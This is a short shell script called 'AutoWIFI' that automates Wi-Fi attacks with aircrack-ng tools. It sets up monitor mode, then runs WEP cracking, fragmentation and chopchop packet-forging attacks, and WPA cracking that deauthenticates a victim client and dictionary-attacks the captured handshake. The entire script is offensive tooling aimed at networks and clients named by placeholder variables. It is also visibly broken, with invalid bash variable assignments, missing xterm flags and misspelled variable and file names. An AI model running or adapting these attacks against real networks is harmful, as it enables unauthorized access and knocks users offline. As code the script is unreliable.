echo "AutoWIFI"
echo "WELCOME . . . . "
$AP=""
$VIC=""
$MAC=""
$essid=""
$type=""
$attack=""
$channel=""
$interface="wlan0"



echo "setting up Monitor mode ....."
iwconfig wlan0 mode monitor channel $channel
ifconfig wlan0 up

sudo xterm -geometry "150x50+50+0" -e "airodump-ng  wlan0"

echo "testing WEP attacks....."
sudo xterm -geometry "150x50+50+0" -e "airodump-ng  --bssid $AP  -w clearcap $interface"
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -0 1 -a $AP -c $VIC wlan0"
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -3 -b $AP -h $MAC wlan0"
sudo xterm -geometry "150x50+50+0" -e "aircrack-ng -0 clearcap-01.cap"


echo "testing WEP fragramention ...."
sudo xterm -geometry "airodump-ng  --bssid $AP  -w frag $interface"
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -1 60 -e $essid -b $AP -h $MAC $interface"
sudo xterm -geometry "150x50+50+0" -e  "aireplay-ng -5 -b $AP -h $MAC $interface"
sudo xterm -geometry "150x50+50+0" -e "packetforge-ng -0 -a $AP -h $MAC -l 192.168.100 -k 192.168.1.255 -y *.xor  -w inject.cap"
sudo xterm -geometry "aireplay-ng -2 -r inject.cap $inteface"
sudo xterm -geometry "150x50+50+0" -e "aircrack-ng frag-01.cap"



echo "Testing CHOCHOP attack ..."
sudo xterm -geometry "150x50+50+0" -e  "airodump-ng --bssid $AP -c channel -w chopchopy $interface"
sudo xterm -geometry "150x50+50+0" -e  "aireplay-ng --fakeauth 0  -a $AP  -h $MAC $interface"
sudo xterm -geometry "150x50+50+0" -e  "packetforge-ng -0 -a $AP -h $MAC -k 255.255.255.255 -l 255.255.255.255 -y *.xor -w chopchopy-forged-packet"
sudo xterm -geometry "150x50+50+0" -e  "aireplay-ng -2 -r chochopy-forged-packet wlan0"
sudo xterm -geometry "150x50+50+0" -e  "aircrack-ng chopchopy-01.cap"



echo "Testing WPA cracking ....."
echo "cracking ..."
sudo xterm -geometry "airodump-ng  --bssid $AP  -w wpatest $interface"
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng -0 1 -a $AP -c $VIC $interface"
sudo xterm -geometry "150x50+50+0" -e "aireplay-ng --deauth 4 -a $AP -c $VIC  wlan0"
sudo xterm -geometry "150x50+50+0" -e "aircrack-ng -0 -w /usr/share/john/password.lst wpatest-01.cap"


echo "Testing WPS attacks ....."#soon
